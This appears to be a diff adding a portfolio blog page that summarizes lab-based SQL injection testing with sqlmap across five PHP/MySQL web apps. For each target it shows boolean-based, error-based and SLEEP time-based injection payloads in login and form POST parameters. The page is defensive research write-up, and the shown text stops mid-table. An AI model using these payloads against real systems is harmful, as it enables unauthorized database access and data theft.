@@ -1,0 +1,909 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+  <meta name="description" content="SQL Injection testing summary across 5 web applications — boolean-based, error-based, time-based blind vulnerabilities found and documented by Habtamu Bitew Gashu.">
+  <meta name="keywords" content="Habtamu Bitew Gashu, SQL injection, sqlmap, ethical hacking, boolean-based blind, error-based, time-based blind, cybersecurity research">
+  <meta name="author" content="Habtamu Bitew Gashu">
+  <link rel="stylesheet" href="../assets/css/style.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous" referrerpolicy="no-referrer">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+  <link id="favicon" rel="shortcut icon" href="../assets/images/favicon.png" type="image/x-png">
+  <title>SQL Injection Research — 5-Target Summary | Habtamu Bitew Gashu</title>
+
+  <style>
+  .blog-page { padding-top: 62px; }
+
+  /* HERO */
+  .blog-hero {
+    background: linear-gradient(160deg, var(--bg-2) 0%, var(--bg) 100%);
+    border-bottom: 1px solid var(--border);
+    padding: 4rem 0 3rem;
+    position: relative;
+    overflow: hidden;
+  }
+  .blog-hero::before {
+    content: '';
+    position: absolute; inset: 0;
+    background-image:
+      linear-gradient(rgba(47,129,247,0.03) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(47,129,247,0.03) 1px, transparent 1px);
+    background-size: 44px 44px;
+    mask-image: radial-gradient(ellipse 80% 80% at 50% 50%, black 20%, transparent 100%);
+  }
+  .blog-hero .container { position: relative; z-index: 1; max-width: 780px; }
+
+  .blog-breadcrumb {
+    display: flex; align-items: center; gap: 0.5rem;
+    font-size: 0.78rem; color: var(--text-3); margin-bottom: 1.5rem;
+  }
+  .blog-breadcrumb a { color: var(--blue); transition: var(--ease); }
+  .blog-breadcrumb a:hover { color: var(--text); }
+  .blog-breadcrumb i { font-size: 0.6rem; }
+
+  .blog-label {
+    display: inline-flex; align-items: center; gap: 0.4rem;
+    background: var(--blue-d); border: 1px solid rgba(47,129,247,0.25);
+    color: var(--blue); font-size: 0.7rem; font-weight: 700;
+    letter-spacing: 0.12em; text-transform: uppercase;
+    padding: 0.3rem 0.85rem; border-radius: 100px; margin-bottom: 1.25rem;
+  }
+
+  .blog-hero h1 {
+    font-size: clamp(1.6rem, 4vw, 2.5rem); font-weight: 900;
+    line-height: 1.15; letter-spacing: -0.025em;
+    color: var(--text); margin-bottom: 1rem;
+  }
+  .blog-hero h1 span { color: var(--blue); }
+
+  .blog-hero-desc {
+    font-size: 1rem; color: var(--text-2);
+    line-height: 1.75; max-width: 660px; margin-bottom: 1.75rem;
+  }
+
+  .blog-meta-row {
+    display: flex; flex-wrap: wrap; align-items: center;
+    gap: 1.25rem; font-size: 0.78rem; color: var(--text-3);
+    padding-top: 1.5rem; border-top: 1px solid var(--border);
+  }
+  .blog-meta-row span { display: flex; align-items: center; gap: 0.35rem; }
+
+  /* LAYOUT */
+  .blog-layout {
+    display: grid; grid-template-columns: 1fr 240px;
+    gap: 3rem; max-width: 1060px; margin: 0 auto;
+    padding: 3rem 2rem 5rem; align-items: start;
+  }
+  @media (max-width: 860px) {
+    .blog-layout { grid-template-columns: 1fr; }
+    .blog-sidebar { display: none; }
+  }
+
+  /* ARTICLE */
+  .blog-article { min-width: 0; }
+  .blog-section { margin-bottom: 3rem; }
+
+  .section-label {
+    font-size: 0.68rem; font-weight: 700; letter-spacing: 0.15em;
+    text-transform: uppercase; color: var(--blue); margin-bottom: 0.5rem;
+    display: flex; align-items: center; gap: 0.6rem;
+  }
+  .section-label::before { content: ''; width: 20px; height: 2px; background: var(--blue); display: block; }
+
+  .blog-article h2 {
+    font-size: 1.35rem; font-weight: 800; letter-spacing: -0.02em;
+    color: var(--text); margin-bottom: 0.6rem; line-height: 1.25;
+  }
+  .blog-article h3 {
+    font-size: 1.05rem; font-weight: 700; color: var(--text);
+    margin-bottom: 0.5rem; margin-top: 1.5rem;
+  }
+  .blog-article p { font-size: 0.92rem; color: var(--text-2); line-height: 1.8; margin-bottom: 0.85rem; }
+  .blog-article strong { color: var(--text); }
+  .blog-article code {
+    font-family: 'Courier New', monospace; font-size: 0.82rem;
+    background: var(--bg-3); border: 1px solid var(--border);
+    padding: 1px 6px; border-radius: 4px; color: var(--blue);
+  }
+
+  .art-divider { height: 1px; background: var(--border); margin: 2.5rem 0; }
+
+  /* ALERT */
+  .alert-box {
+    background: rgba(47,129,247,0.06); border: 1px solid rgba(47,129,247,0.2);
+    border-radius: var(--r); padding: 14px 18px; font-size: 0.82rem;
+    color: var(--blue); display: flex; align-items: flex-start;
+    gap: 0.6rem; margin-bottom: 1.5rem; line-height: 1.6;
+  }
+  .alert-box i { margin-top: 2px; flex-shrink: 0; }
+
+  /* STAT ROW */
+  .stat-strip {
+    display: grid; grid-template-columns: repeat(4, 1fr);
+    gap: 0.75rem; margin-bottom: 2rem;
+  }
+  @media (max-width: 540px) { .stat-strip { grid-template-columns: repeat(2, 1fr); } }
+  .stat-tile {
+    background: var(--bg-2); border: 1px solid var(--border);
+    border-radius: var(--r); padding: 1rem 0.75rem; text-align: center;
+    transition: var(--ease);
+  }
+  .stat-tile:hover { border-color: var(--blue); transform: translateY(-2px); }
+  .stat-tile .st-num {
+    font-size: 1.6rem; font-weight: 900; color: var(--blue);
+    font-family: 'Courier New', monospace; display: block; line-height: 1;
+  }
+  .stat-tile .st-label { font-size: 0.68rem; color: var(--text-3); margin-top: 4px; }
+
+  /* LOG CARDS */
+  .log-card {
+    background: var(--bg-2); border: 1px solid var(--border);
+    border-radius: var(--r-lg); overflow: hidden; margin-bottom: 1.5rem;
+  }
+  .log-card-header {
+    background: var(--bg-3); padding: 14px 20px;
+    display: flex; align-items: center; justify-content: space-between;
+    flex-wrap: wrap; gap: 0.6rem; border-bottom: 1px solid var(--border);
+  }
+  .log-card-id {
+    font-size: 0.7rem; font-weight: 700; letter-spacing: 0.1em;
+    text-transform: uppercase; color: #f85149;
+    background: var(--red-d); padding: 0.2rem 0.7rem;
+    border-radius: 100px; border: 1px solid rgba(248,81,73,0.25);
+  }
+  .log-card-title { font-size: 0.95rem; font-weight: 700; color: var(--text); }
+  .log-card-meta {
+    display: flex; gap: 1rem; flex-wrap: wrap;
+    font-size: 0.72rem; color: var(--text-3);
+  }
+  .log-card-meta span { display: flex; align-items: center; gap: 0.3rem; }
+  .log-card-body { padding: 18px 20px; }
+  .log-card-desc { font-size: 0.85rem; color: var(--text-2); line-height: 1.7; margin-bottom: 1rem; }
+
+  /* VULN TYPE BADGES */
+  .vuln-types { display: flex; flex-wrap: wrap; gap: 0.4rem; margin-bottom: 1rem; }
+  .vtag {
+    font-size: 0.68rem; font-weight: 700; padding: 0.2rem 0.65rem;
+    border-radius: 100px; text-transform: uppercase; letter-spacing: 0.04em;
+  }
+  .vtag-bool   { background: var(--orange-d); color: var(--orange); border: 1px solid rgba(240,136,62,0.25); }
+  .vtag-error  { background: var(--red-d);    color: #f85149;       border: 1px solid rgba(248,81,73,0.25); }
+  .vtag-time   { background: var(--gold-d);   color: var(--gold);   border: 1px solid rgba(212,167,44,0.25); }
+  .vtag-union  { background: var(--purple-d); color: var(--purple); border: 1px solid rgba(163,113,247,0.25); }
+
+  /* PARAM TABLE */
+  .param-table { width: 100%; border-collapse: collapse; font-size: 0.8rem; margin-bottom: 1rem; }
+  .param-table th {
+    text-align: left; font-size: 0.65rem; font-weight: 700;
+    letter-spacing: 0.1em; text-transform: uppercase; color: var(--text-3);
+    padding: 8px 12px; border-bottom: 1px solid var(--border);
+    background: var(--bg-3);
+  }
+  .param-table td { padding: 8px 12px; border-bottom: 1px solid rgba(255,255,255,0.04); color: var(--text-2); }
+  .param-table tr:last-child td { border-bottom: none; }
+  .param-table tr:hover td { background: var(--bg-3); }
+  .param-table .param-name { font-family: 'Courier New', monospace; color: var(--blue); }
+
+  /* CODE BLOCKS */
+  .code-block { border-radius: var(--r); overflow: hidden; border: 1px solid var(--border); margin-bottom: 1rem; }
+  .code-top {
+    background: var(--bg-3); padding: 9px 14px;
+    display: flex; align-items: center; justify-content: space-between;
+    border-bottom: 1px solid var(--border);
+  }
+  .code-dots { display: flex; gap: 5px; }
+  .cdot { width: 9px; height: 9px; border-radius: 50%; }
+  .cdot:nth-child(1){background:#f85149;}.cdot:nth-child(2){background:var(--gold);}.cdot:nth-child(3){background:var(--green);}
+  .code-fname { font-size: 0.72rem; color: var(--text-3); font-family: 'Courier New', monospace; }
+  .ctag { font-size: 0.62rem; font-weight: 700; letter-spacing: 0.1em; text-transform: uppercase; padding: 2px 8px; border-radius: 100px; }
+  .ctag-blue   { background: var(--blue-d);   color: var(--blue);   border: 1px solid rgba(47,129,247,0.25); }
+  .ctag-orange { background: var(--orange-d); color: var(--orange); border: 1px solid rgba(240,136,62,0.25); }
+  .ctag-red    { background: var(--red-d);    color: #f85149;       border: 1px solid rgba(248,81,73,0.25); }
+  .ctag-gold   { background: var(--gold-d);   color: var(--gold);   border: 1px solid rgba(212,167,44,0.25); }
+  .ctag-purple { background: var(--purple-d); color: var(--purple); border: 1px solid rgba(163,113,247,0.25); }
+  .code-body {
+    background: #060b13; padding: 16px 18px;
+    font-family: 'Courier New', monospace; font-size: 0.76rem;
+    line-height: 1.85; overflow-x: auto; color: var(--text-2);
+  }
+  .code-body pre { margin: 0; white-space: pre-wrap; word-break: break-all; }
+  .kw  { color: #c792ea; } .fn  { color: #82aaff; } .str { color: #c3e88d; }
+  .num { color: #f78c6c; } .cm  { color: #4a6070; font-style: italic; }
+  .vr  { color: #ffcb6b; } .op  { color: #89ddff; } .hl  { color: #f85149; }
+
+  /* VIEW LINK */
+  .log-view-link {
+    display: inline-flex; align-items: center; gap: 0.4rem;
+    font-size: 0.78rem; font-weight: 600; color: var(--blue);
+    border: 1px solid rgba(47,129,247,0.25);
+    background: var(--blue-d); padding: 0.35rem 0.9rem;
+    border-radius: 6px; transition: var(--ease);
+    text-decoration: none;
+  }
+  .log-view-link:hover { background: var(--blue); color: #fff; transform: translateY(-1px); }
+
+  /* MATRIX */
+  .vuln-matrix {
+    width: 100%; border-collapse: collapse;
+    font-size: 0.78rem; border-radius: var(--r);
+    overflow: hidden; border: 1px solid var(--border);
+  }
+  .vuln-matrix th {
+    background: var(--bg-3); padding: 10px 14px; text-align: center;
+    font-size: 0.65rem; font-weight: 700; letter-spacing: 0.08em;
+    text-transform: uppercase; color: var(--text-3);
+    border-bottom: 1px solid var(--border);
+  }
+  .vuln-matrix th:first-child { text-align: left; }
+  .vuln-matrix td {
+    padding: 10px 14px; text-align: center;
+    border-bottom: 1px solid rgba(255,255,255,0.04); color: var(--text-2);
+  }
+  .vuln-matrix td:first-child { text-align: left; font-weight: 600; color: var(--text); }
+  .vuln-matrix tr:last-child td { border-bottom: none; }
+  .vuln-matrix tr:hover td { background: var(--bg-3); }
+  .check { color: var(--green); font-size: 1rem; }
+  .cross { color: var(--text-3); font-size: 0.9rem; opacity: 0.3; }
+
+  /* MITIGATIONS */
+  .mitigation-list { display: flex; flex-direction: column; gap: 0.75rem; }
+  .mit-item {
+    display: flex; align-items: flex-start; gap: 0.85rem;
+    background: rgba(63,185,80,0.04);
+    border: 1px solid rgba(63,185,80,0.14);
+    border-radius: var(--r); padding: 14px 16px;
+    transition: var(--ease);
+  }
+  .mit-item:hover { background: rgba(63,185,80,0.08); border-color: rgba(63,185,80,0.3); }
+  .mit-num {
+    width: 26px; height: 26px; border-radius: 50%; flex-shrink: 0;
+    background: rgba(63,185,80,0.12); border: 1px solid rgba(63,185,80,0.25);
+    display: flex; align-items: center; justify-content: center;
+    font-size: 0.65rem; font-weight: 700; color: var(--green);
+    font-family: 'Courier New', monospace;
+  }
+  .mit-body { flex: 1; }
+  .mit-title { font-size: 0.88rem; font-weight: 700; color: var(--green); margin-bottom: 0.25rem; }
+  .mit-desc { font-size: 0.78rem; color: var(--text-2); line-height: 1.55; }
+  .mit-code {
+    margin-top: 0.5rem; font-family: 'Courier New', monospace;
+    font-size: 0.72rem; color: var(--blue);
+    background: var(--bg-3); border: 1px solid var(--border);
+    padding: 6px 10px; border-radius: 4px; overflow-x: auto;
+  }
+
+  /* SIDEBAR */
+  .blog-sidebar { position: sticky; top: 78px; }
+  .sidebar-card { background: var(--bg-2); border: 1px solid var(--border); border-radius: var(--r); padding: 1.25rem; margin-bottom: 1rem; }
+  .sidebar-title { font-size: 0.72rem; font-weight: 700; letter-spacing: 0.1em; text-transform: uppercase; color: var(--text-3); margin-bottom: 0.85rem; padding-bottom: 0.6rem; border-bottom: 1px solid var(--border); }
+  .toc-item { font-size: 0.78rem; color: var(--text-2); padding: 0.35rem 0; border-bottom: 1px solid rgba(255,255,255,0.04); display: flex; gap: 0.5rem; align-items: center; text-decoration: none; transition: var(--ease); }
+  .toc-item:hover { color: var(--text); }
+  .toc-item:last-child { border-bottom: none; }
+  .toc-num { font-size: 0.65rem; color: var(--text-3); font-family: 'Courier New', monospace; min-width: 20px; }
+  .smeta-item { font-size: 0.78rem; color: var(--text-2); display: flex; justify-content: space-between; align-items: center; padding: 0.35rem 0; border-bottom: 1px solid rgba(255,255,255,0.04); }
+  .smeta-item:last-child { border-bottom: none; }
+  .smeta-item .sl { font-size: 0.68rem; color: var(--text-3); }
+  .smeta-item .sv { font-size: 0.75rem; color: var(--text); font-weight: 600; }
+
+  /* BACK NAV */
+  .blog-nav-back { display: flex; gap: 0.85rem; flex-wrap: wrap; padding-top: 2rem; border-top: 1px solid var(--border); margin-top: 3rem; }
+  </style>
+</head>
+<body class="blog-page">
+
+  <!-- NAVBAR -->
+  <header class="header" id="header">
+    <nav class="nav container">
+      <a href="../index.html" class="nav__logo">HBG<span>.</span></a>
+      <div class="nav__menu" id="nav-menu">
+        <ul class="nav__list">
+          <li><a href="../index.html#home"      class="nav__link">Home</a></li>
+          <li><a href="../index.html#about"     class="nav__link">About</a></li>
+          <li><a href="../index.html#projects"  class="nav__link">Projects</a></li>
+          <li><a href="../index.html#cyberlogs" class="nav__link active-link">Cyberlogs</a></li>
+          <li><a href="../index.html#contact"   class="nav__link">Contact</a></li>
+        </ul>
+        <span class="nav__close" id="nav-close"><i class="fas fa-times"></i></span>
+      </div>
+      <a href="../resume.html" class="btn btn--outline btn--sm nav__hire">Hire Me</a>
+      <span class="nav__toggle" id="nav-toggle"><i class="fas fa-bars"></i></span>
+    </nav>
+  </header>
+
+  <!-- HERO -->
+  <div class="blog-hero">
+    <div class="container">
+      <div class="blog-breadcrumb">
+        <a href="../index.html">Home</a>
+        <i class="fas fa-chevron-right"></i>
+        <a href="../index.html#cyberlogs">Cyberlogs</a>
+        <i class="fas fa-chevron-right"></i>
+        <span>SQL Injection — 5-Target Summary</span>
+      </div>
+      <div class="blog-label"><i class="fas fa-database"></i> Security Research — SQL Injection</div>
+      <h1><span>SQL Injection</span> Testing Across 5 Web Applications</h1>
+      <p class="blog-hero-desc">
+        A consolidated summary of ethical SQL injection testing conducted across five PHP/MySQL web applications in a controlled lab environment using sqlmap. All five targets were found vulnerable — with boolean-based blind, error-based, and time-based blind injection vectors confirmed.
+      </p>
+      <div class="blog-meta-row">
+        <span><i class="fas fa-circle" style="color:var(--blue);font-size:6px;"></i> Habtamu Bitew Gashu</span>
+        <span><i class="fas fa-calendar-alt"></i> March 10, 2025</span>
+        <span><i class="fas fa-clock"></i> 10 min read</span>
+        <span><i class="fas fa-flask"></i> Controlled lab environment</span>
+        <span><i class="fas fa-database"></i> sqlmap / MySQL</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- LAYOUT -->
+  <div class="blog-layout container">
+    <article class="blog-article">
+
+      <!-- INTRO -->
+      <div class="blog-section">
+        <div class="alert-box">
+          <i class="fas fa-info-circle"></i>
+          <span>All testing was performed on local or controlled-environment web applications. No production systems or real user data were targeted. Payloads are sanitized for publication. This research is documented for educational and defensive purposes only.</span>
+        </div>
+        <p>
+          Between February and March 2025 I ran a series of SQL injection assessments against five PHP/MySQL web applications deployed in isolated lab environments. The targets ranged from a simple login page to a multi-form travel management system. Every application tested returned at least one confirmed injection point.
+        </p>
+        <p>
+          All tests used <strong>sqlmap</strong> — the open-source SQL injection automation tool — and all findings are presented here with sanitized payloads. The goal is to document real-world vulnerability patterns and provide actionable mitigations for developers.
+        </p>
+
+        <!-- STAT STRIP -->
+        <div class="stat-strip">
+          <div class="stat-tile">
+            <span class="st-num">5</span>
+            <div class="st-label">Apps Tested</div>
+          </div>
+          <div class="stat-tile">
+            <span class="st-num">5</span>
+            <div class="st-label">Vulnerable</div>
+          </div>
+          <div class="stat-tile">
+            <span class="st-num">1552</span>
+            <div class="st-label">HTTP Requests</div>
+          </div>
+          <div class="stat-tile">
+            <span class="st-num">7</span>
+            <div class="st-label">Injection Points</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="art-divider"></div>
+
+      <!-- VULNERABILITY MATRIX -->
+      <div class="blog-section" id="matrix">
+        <div class="section-label">Overview</div>
+        <h2>Vulnerability Matrix</h2>
+        <p>Summary of injection types found across all five targets. All apps ran PHP on Apache with a MariaDB/MySQL backend.</p>
+
+        <table class="vuln-matrix">
+          <thead>
+            <tr>
+              <th>Target</th>
+              <th>Boolean-Based</th>
+              <th>Error-Based</th>
+              <th>Time-Based</th>
+              <th>Requests</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td>Local Web App <span style="font-size:0.68rem;color:var(--text-3);">(LOG-001)</span></td>
+              <td><span class="check">✓</span></td>
+              <td><span class="check">✓</span></td>
+              <td><span class="check">✓</span></td>
+              <td><span style="font-family:'Courier New',monospace;color:var(--blue);">119</span></td>
+            </tr>
+            <tr>
+              <td>Travel System — Login <span style="font-size:0.68rem;color:var(--text-3);">(LOG-002)</span></td>
+              <td><span class="check">✓</span></td>
+              <td><span class="cross">—</span></td>
+              <td><span class="check">✓</span></td>
+              <td><span style="font-family:'Courier New',monospace;color:var(--blue);">769</span></td>
+            </tr>
+            <tr>
+              <td>Travel System — Forms <span style="font-size:0.68rem;color:var(--text-3);">(LOG-003)</span></td>
+              <td><span class="cross">—</span></td>
+              <td><span class="cross">—</span></td>
+              <td><span class="check">✓</span></td>
+              <td><span style="font-family:'Courier New',monospace;color:var(--blue);">260</span></td>
+            </tr>
+            <tr>
+              <td>User Registration — Email <span style="font-size:0.68rem;color:var(--text-3);">(LOG-004)</span></td>
+              <td><span class="check">✓</span></td>
+              <td><span class="check">✓</span></td>
+              <td><span class="check">✓</span></td>
+              <td><span style="font-family:'Courier New',monospace;color:var(--blue);">272</span></td>
+            </tr>
+            <tr>
+              <td>Bus Management System <span style="font-size:0.68rem;color:var(--text-3);">(LOG-005)</span></td>
+              <td><span class="check">✓</span></td>
+              <td><span class="check">✓</span></td>
+              <td><span class="check">✓</span></td>
+              <td><span style="font-family:'Courier New',monospace;color:var(--blue);">132</span></td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="art-divider"></div>
+
+      <!-- LOG 001 -->
+      <div class="blog-section" id="log001">
+        <div class="section-label">LOG-2025-001</div>
+        <h2>Local Web App — Login Form</h2>
+
+        <div class="log-card">
+          <div class="log-card-header">
+            <div>
+              <div class="log-card-id">LOG-2025-001</div>
+            </div>
+            <div class="log-card-title">Local Test Web Application</div>
+            <div class="log-card-meta">
+              <span><i class="fas fa-calendar-alt"></i> 2025-03-10</span>
+              <span><i class="fas fa-exchange-alt"></i> 119 HTTP requests</span>
+              <span><i class="fas fa-code"></i> PHP 8.2.4 / Apache 2.4.56</span>
+              <span><i class="fas fa-database"></i> MySQL ≥ 5.0 (MariaDB)</span>
+            </div>
+          </div>
+          <div class="log-card-body">
+            <p class="log-card-desc">
+              A straightforward login form with a <code>user</code> POST parameter exposed three distinct injection vectors. This is the most complete injection profile in this test series — all three major blind and in-band types were confirmed.
+            </p>
+            <div class="vuln-types">
+              <span class="vtag vtag-bool">Boolean-Based Blind</span>
+              <span class="vtag vtag-error">Error-Based</span>
+              <span class="vtag vtag-time">Time-Based Blind</span>
+            </div>
+            <table class="param-table">
+              <thead><tr><th>Parameter</th><th>Method</th><th>Injection Type</th></tr></thead>
+              <tbody>
+                <tr><td class="param-name">user</td><td>POST</td><td>Boolean-based blind (OR clause)</td></tr>
+                <tr><td class="param-name">user</td><td>POST</td><td>Error-based (FLOOR)</td></tr>
+                <tr><td class="param-name">user</td><td>POST</td><td>Time-based blind (SLEEP)</td></tr>
+              </tbody>
+            </table>
+            <div class="code-block">
+              <div class="code-top">
+                <div class="code-dots"><div class="cdot"></div><div class="cdot"></div><div class="cdot"></div></div>
+                <span class="code-fname">sqlmap — LOG-2025-001</span>
+                <span class="ctag ctag-orange">Boolean-Based Blind</span>
+              </div>
+              <div class="code-body"><pre><span class="cm"># Parameter: user (POST) — OR boolean-based blind</span>
+<span class="vr">user</span><span class="op">=</span><span class="hl">-5459' OR 3914=3914#</span><span class="op">&</span><span class="vr">pwd</span><span class="op">=</span>sdfgsdf</pre></div>
+            </div>
+            <div class="code-block">
+              <div class="code-top">
+                <div class="code-dots"><div class="cdot"></div><div class="cdot"></div><div class="cdot"></div></div>
+                <span class="code-fname">sqlmap — LOG-2025-001</span>
+                <span class="ctag ctag-red">Error-Based (FLOOR)</span>
+              </div>
+              <div class="code-body"><pre><span class="cm"># Parameter: user (POST) — MySQL FLOOR error-based</span>
+<span class="vr">user</span><span class="op">=</span>dfgsdf<span class="hl">' AND (SELECT ... FLOOR(RAND(0)*2))-- VRPJ</span><span class="op">&</span><span class="vr">pwd</span><span class="op">=</span>sdfgsdf</pre></div>
+            </div>
+            <div class="code-block">
+              <div class="code-top">
+                <div class="code-dots"><div class="cdot"></div><div class="cdot"></div><div class="cdot"></div></div>
+                <span class="code-fname">sqlmap — LOG-2025-001</span>
+                <span class="ctag ctag-gold">Time-Based Blind</span>
+              </div>
+              <div class="code-body"><pre><span class="cm"># Parameter: user (POST) — SLEEP-based time delay</span>
+<span class="vr">user</span><span class="op">=</span>dfgsdf<span class="hl">' AND SLEEP(5)-- vbgY</span><span class="op">&</span><span class="vr">pwd</span><span class="op">=</span>sdfgsdf</pre></div>
+            </div>
+            <a href="log1.html" class="log-view-link"><i class="fas fa-file-alt"></i> View Full Log</a>
+          </div>
+        </div>
+      </div>
+
+      <div class="art-divider"></div>
+
+      <!-- LOG 002 -->
+      <div class="blog-section" id="log002">
+        <div class="section-label">LOG-2025-002</div>
+        <h2>Travel Management System — Login Form</h2>
+
+        <div class="log-card">
+          <div class="log-card-header">
+            <div><div class="log-card-id">LOG-2025-002</div></div>
+            <div class="log-card-title">Travel Management System</div>
+            <div class="log-card-meta">
+              <span><i class="fas fa-calendar-alt"></i> 2025-03-10</span>
+              <span><i class="fas fa-exchange-alt"></i> 769 HTTP requests</span>
+              <span><i class="fas fa-code"></i> PHP 8.0.28 / Apache 2.4.56</span>
+              <span><i class="fas fa-database"></i> MySQL ≥ 5.0.12 (MariaDB)</span>
+            </div>
+          </div>
+          <div class="log-card-body">
+            <p class="log-card-desc">
+              The login form of this travel management system was vulnerable to two injection types. Notably this test required <strong>769 HTTP requests</strong> — the highest in the series — suggesting the application had some form of response variation that required more probing to confirm.
+            </p>
+            <div class="vuln-types">
+              <span class="vtag vtag-bool">Boolean-Based Blind</span>
+              <span class="vtag vtag-time">Time-Based Blind</span>
+            </div>
+            <table class="param-table">
+              <thead><tr><th>Parameter</th><th>Method</th><th>Injection Type</th></tr></thead>
+              <tbody>
+                <tr><td class="param-name">username</td><td>POST</td><td>Boolean-based blind (NOT clause)</td></tr>
+                <tr><td class="param-name">username</td><td>POST</td><td>Time-based blind (SLEEP)</td></tr>
+              </tbody>
+            </table>
+            <div class="code-block">
+              <div class="code-top">
+                <div class="code-dots"><div class="cdot"></div><div class="cdot"></div><div class="cdot"></div></div>
+                <span class="code-fname">sqlmap — LOG-2025-002</span>
+                <span class="ctag ctag-orange">Boolean-Based Blind (NOT)</span>
+              </div>
+              <div class="code-body"><pre><span class="cm"># Parameter: username (POST) — OR NOT boolean-based</span>
+<span class="vr">username</span><span class="op">=</span>ss<span class="hl">' OR NOT 9157=9157-- DRkR</span><span class="op">&</span><span class="vr">password</span><span class="op">=</span>dd<span class="op">&</span><span class="vr">login</span><span class="op">=</span>Login</pre></div>
+            </div>
+            <div class="code-block">
+              <div class="code-top">
+                <div class="code-dots"><div class="cdot"></div><div class="cdot"></div><div class="cdot"></div></div>
+                <span class="code-fname">sqlmap — LOG-2025-002</span>
+                <span class="ctag ctag-gold">Time-Based Blind</span>
+              </div>
+              <div class="code-body"><pre><span class="cm"># Parameter: username (POST) — subquery SLEEP</span>
+<span class="vr">username</span><span class="op">=</span>ss<span class="hl">' AND (SELECT 4945 FROM (SELECT(SLEEP(5)))GSUK)-- OYSx</span><span class="op">&</span><span class="vr">password</span><span class="op">=</span>dd</pre></div>
+            </div>
+            <a href="log2.html" class="log-view-link"><i class="fas fa-file-alt"></i> View Full Log</a>
+          </div>
+        </div>
+      </div>
+
+      <div class="art-divider"></div>
+
+      <!-- LOG 003 -->
+      <div class="blog-section" id="log003">
+        <div class="section-label">LOG-2025-003</div>
+        <h2>Travel Management System — Multiple Form Inputs</h2>
+
+        <div class="log-card">
+          <div class="log-card-header">
+            <div><div class="log-card-id">LOG-2025-003</div></div>
+            <div class="log-card-title">Travel Management System (Multiple Forms)</div>
+            <div class="log-card-meta">
+              <span><i class="fas fa-calendar-alt"></i> 2025-03-10</span>
+              <span><i class="fas fa-exchange-alt"></i> 260 HTTP requests</span>
+              <span><i class="fas fa-code"></i> PHP 8.0.28 / Apache 2.4.56</span>
+              <span><i class="fas fa-database"></i> MySQL ≥ 5.0.12 (MariaDB)</span>
+            </div>
+          </div>
+          <div class="log-card-body">
+            <p class="log-card-desc">
+              A second assessment of the same travel management system — this time targeting two distinct form inputs on separate pages. Both the login <code>username</code> field and the message form's <code>firstname</code> field were confirmed vulnerable to time-based blind injection. This demonstrates that the lack of input sanitization was application-wide, not limited to one endpoint.
+            </p>
+            <div class="vuln-types">
+              <span class="vtag vtag-time">Time-Based Blind (×2 parameters)</span>
+            </div>
+            <table class="param-table">
+              <thead><tr><th>Parameter</th><th>Method</th><th>Form</th><th>Injection Type</th></tr></thead>
+              <tbody>
+                <tr><td class="param-name">username</td><td>POST</td><td>Login form</td><td>Time-based blind (SLEEP)</td></tr>
+                <tr><td class="param-name">firstname</td><td>POST</td><td>Message form</td><td>Time-based blind (SLEEP)</td></tr>
+              </tbody>
+            </table>
+            <div class="code-block">
+              <div class="code-top">
+                <div class="code-dots"><div class="cdot"></div><div class="cdot"></div><div class="cdot"></div></div>
+                <span class="code-fname">sqlmap — LOG-2025-003 (username)</span>
+                <span class="ctag ctag-gold">Time-Based Blind</span>
+              </div>
+              <div class="code-body"><pre><span class="cm"># Parameter: username — login form</span>
+<span class="vr">username</span><span class="op">=</span>ss<span class="hl">' AND (SELECT 7981 FROM (SELECT(SLEEP(5)))JEzE) AND 'QYRN'='QYRN</span>
+<span class="op">&</span><span class="vr">password</span><span class="op">=</span>dd<span class="op">&</span><span class="vr">login</span><span class="op">=</span>Login</pre></div>
+            </div>
+            <div class="code-block">
+              <div class="code-top">
+                <div class="code-dots"><div class="cdot"></div><div class="cdot"></div><div class="cdot"></div></div>
+                <span class="code-fname">sqlmap — LOG-2025-003 (firstname)</span>
+                <span class="ctag ctag-gold">Time-Based Blind</span>
+              </div>
+              <div class="code-body"><pre><span class="cm"># Parameter: firstname — message form (separate endpoint)</span>
+<span class="vr">firstname</span><span class="op">=</span>kk<span class="hl">' AND (SELECT 8085 FROM (SELECT(SLEEP(5)))rRzr) AND 'XFtD'='XFtD</span>
+<span class="op">&</span><span class="vr">message</span><span class="op">=</span>kk<span class="op">&</span><span class="vr">submit</span><span class="op">=</span>Submit</pre></div>
+            </div>
+            <a href="log3.html" class="log-view-link"><i class="fas fa-file-alt"></i> View Full Log</a>
+          </div>
+        </div>
+      </div>
+
+      <div class="art-divider"></div>
+
+      <!-- LOG 004 -->
+      <div class="blog-section" id="log004">
+        <div class="section-label">LOG-2025-004</div>
+        <h2>User Registration System — Email Field</h2>
+
+        <div class="log-card">
+          <div class="log-card-header">
+            <div><div class="log-card-id">LOG-2025-004</div></div>
+            <div class="log-card-title">User Registration System</div>
+            <div class="log-card-meta">
+              <span><i class="fas fa-calendar-alt"></i> 2025-03-10</span>
+              <span><i class="fas fa-exchange-alt"></i> 272 HTTP requests</span>
+              <span><i class="fas fa-code"></i> PHP 8.1.17 / Apache 2.4.56</span>
+              <span><i class="fas fa-database"></i> MySQL ≥ 5.0 (MariaDB)</span>
+            </div>
+          </div>
+          <div class="log-card-body">
+            <p class="log-card-desc">
+              A user registration endpoint exposed the <code>Email</code> field to all three injection types. The error-based payload here is particularly notable — it uses the <code>INFORMATION_SCHEMA.PLUGINS</code> table with a GROUP BY and FLOOR RAND trick, which can leak data through MySQL error messages when error reporting is enabled.
+            </p>
+            <div class="vuln-types">
+              <span class="vtag vtag-bool">Boolean-Based Blind</span>
+              <span class="vtag vtag-error">Error-Based</span>
+              <span class="vtag vtag-time">Time-Based Blind</span>
+            </div>
+            <table class="param-table">
+              <thead><tr><th>Parameter</th><th>Method</th><th>Injection Type</th></tr></thead>
+              <tbody>
